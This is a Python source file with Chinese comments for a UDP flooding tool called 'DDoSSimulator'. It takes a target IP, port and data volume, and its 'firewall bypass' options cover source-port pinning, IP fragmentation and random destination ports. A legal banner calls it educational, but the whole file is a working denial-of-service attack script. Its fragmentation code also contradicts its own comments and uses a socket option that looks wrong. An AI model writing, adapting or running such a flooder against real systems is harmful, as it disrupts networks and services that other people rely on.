import sys
import os
import time
import socket
import ipaddress
import random

class DDoSSimulator:
    """UDP 数据包发送模拟器"""

    def __init__(self):
        self.target_ip = None
        self.target_port = None
        self.total_gb = 0.0
        self.max_packets = 0
        self.rate_limit = 0.0

        # 绕过选项
        self.source_port = None          # 指定源端口，None 表示随机
        self.use_fragmentation = False   # 是否启用 IP 分片
        self.random_target_port = False  # 是否随机化目标端口

        self.sock = None
        self.payload_size = 1490         # 默认单包载荷大小
        self.payload = None

    def show_banner(self):
        """显示警告和法律声明"""
        os.system('cls' if os.name == 'nt' else 'clear')
        print("=" * 60)
        print("  DDOS-Attack 教育版 (防火墙绕过实验) v3.0")
        print("=" * 60)
        print("法律警告：")
        print("本工具仅用于教育目的，必须在完全隔离的实验室环境中使用。")
        print("你只能攻击自己拥有合法授权的设备。")
        print("未经授权的攻击是严重的犯罪行为，将承担法律责任。")
        print("=" * 60)
        input("按回车键继续，或按 Ctrl+C 退出...")

    def get_target_info(self):
        """获取并验证目标 IP、端口、流量、速率限制及绕过选项"""
        # ---------- 目标 IP ----------
        while True:
            try:
                ip_str = input("请输入目标 IP 地址: ").strip()
                ipaddress.ip_address(ip_str)   # 验证合法性
                self.target_ip = ip_str
                break
            except ValueError:
                print("[!] 无效的 IP 地址，请重新输入。")

        # ---------- 目标端口 ----------
        while True:
            try:
                port_str = input("请输入目标端口 (1-65535): ").strip()
                port = int(port_str)
                if 1 <= port <= 65535:
                    self.target_port = port
                    break
                else:
                    print("[!] 端口必须在 1-65535 之间。")
            except ValueError:
                print("[!] 无效的端口号，请输入数字。")

        # ---------- 总流量 (GB) ----------
        while True:
            try:
                gb_str = input("请输入要发送的总数据量 (GB): ").strip()
                self.total_gb = float(gb_str)
                if self.total_gb <= 0:
                    print("[!] 流量必须大于 0 GB。")
                    continue
                break
            except ValueError:
                print("[!] 无效的数值，请输入数字。")

        # ---------- 发包间隔 (速率限制) ----------
        try:
            rate_str = input("请输入发包间隔（秒，0 表示不限速，例如 0.1）: ").strip()
            self.rate_limit = float(rate_str)
        except ValueError:
            self.rate_limit = 0.0

        # ---------- 绕过选项 ----------
        print("\n--- 防火墙绕过选项 (仅供实验) ---")
        src = input("指定源端口 (留空则系统随机分配): ").strip()
        self.source_port = int(src) if src else None

        frag = input("启用 IP 分片? (y/N): ").strip().lower()
        self.use_fragmentation = (frag == 'y')

        rnd = input("使用随机目标端口? (y/N): ").strip().lower()
        self.random_target_port = (rnd == 'y')

        # ---------- 计算总包数 ----------
        if self.use_fragmentation:
            self.payload_size = 3000   # 大于常见 MTU，强制分片
        else:
            self.payload_size = 1490

        total_bytes = int(self.total_gb * 1024 * 1024 * 1024)
        self.max_packets = total_bytes // self.payload_size
        print(f"\n[*] 将发送 {self.max_packets} 个数据包，总计 {self.total_gb:.2f} GB。")
        if self.rate_limit > 0:
            print(f"[*] 发包间隔: {self.rate_limit} 秒")
        if self.source_port is not None:
            print(f"[*] 源端口: {self.source_port}")
        if self.use_fragmentation:
            print(f"[*] IP 分片已启用，单包载荷 {self.payload_size} 字节")
        if self.random_target_port:
            print("[*] 随机目标端口模式已启用")

    def target_reachable(self):
        """简单 TCP 连通性检查（目标是否可达且 TCP 端口可能开放）"""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(2)
                s.connect((self.target_ip, self.target_port))
            return True
        except (socket.timeout, ConnectionRefusedError, OSError):
            return False

    def send_packets(self):
        """开始发送 UDP 数据包，包含绕过功能"""
        print(f"\n[*] 目标: {self.target_ip}:{self.target_port}")
        print(f"[*] 发送数据包数量: {self.max_packets}")
        print(f"[*] 发包速率限制: {self.rate_limit if self.rate_limit > 0 else '无（最大速度）'}")
        print("[*] 按 Ctrl+C 停止。\n")

        # 创建 UDP socket
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        # 源端口绑定
        if self.source_port is not None:
            try:
                self.sock.bind(('', self.source_port))
            except OSError as e:
                print(f"[!] 无法绑定源端口 {self.source_port}: {e}")
                self.sock.close()
                sys.exit(1)

        # IP 分片设置
        if self.use_fragmentation:
            # IP_MTU_DISCOVER 设置路径 MTU 发现策略；PMTUDISC_DO 表示始终进行路径 MTU 发现
            # 允许分片（DONTFRAGMENT=0）
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_MTU_DISCOVER, socket.IP_PMTUDISC_DO)
            self.sock.setsockopt(socket.IPPROTO_IP, socket.IP_DONTFRAGMENT, 0)

        # 生成随机载荷
        self.payload = os.urandom(self.payload_size)

        sent = 0
        sent_bytes = 0
        start_time = time.time()
        next_mb_threshold = 1024 * 1024   # 1 MB

        try:
            while sent < self.max_packets:
                # 确定当前目标端口
                if self.random_target_port:
                    current_port = random.randint(1, 65535)
                else:
                    current_port = self.target_port

                self.sock.sendto(self.payload, (self.target_ip, current_port))
                sent += 1
                sent_bytes += self.payload_size

                # 每 1 MB 输出一次进度
                if sent_bytes >= next_mb_threshold:
                    mb_sent = sent_bytes / (1024 * 1024)
                    elapsed = time.time() - start_time
                    pps = sent / elapsed if elapsed > 0 else 0
                    print(f"已发送: {sent} 包 ({mb_sent:.2f} MB) | 用时: {elapsed:.1f}s | 速率: {pps:.1f} pps")
                    next_mb_threshold += 1024 * 1024

                if self.rate_limit > 0:
                    time.sleep(self.rate_limit)

        except KeyboardInterrupt:
            print(f"\n\n[!] 用户手动停止发送。")
        except Exception as e:
            print(f"\n[!] 错误: {e}")
        finally:
            self.sock.close()
            elapsed = time.time() - start_time
            print(f"\n[+] 发送完成。总包数: {sent}, 总数据量: {sent_bytes / (1024*1024):.2f} MB, 用时: {elapsed:.2f} 秒。")

    def run(self):
        """主流程"""
        self.show_banner()
        self.get_target_info()

        # 最终确认
        while True:
            confirm = input("\n[!] 最后警告：你即将向目标发送大量 UDP 流量。请确认 (yes/no): ").strip().lower()
            if confirm == 'yes':
                break
            elif confirm == 'no':
                print("[*] 用户取消。")
                sys.exit(0)
            else:
                print("[!] 请输入 yes 或 no。")

        # 连通性检查（可跳过）
        print("\n[*] 正在检查目标 TCP 连通性...")
        if not self.target_reachable():
            print("[!] 目标似乎不可达或 TCP 端口未开放。")
            choice = input("是否仍要尝试发送？(y/n): ").strip().lower()
            if choice != 'y':
                sys.exit(0)

        self.send_packets()


if __name__ == "__main__":
    try:
        simulator = DDoSSimulator()
        simulator.run()
    except KeyboardInterrupt:
        print("\n[*] 程序被用户终止。")
        sys.exit(0)
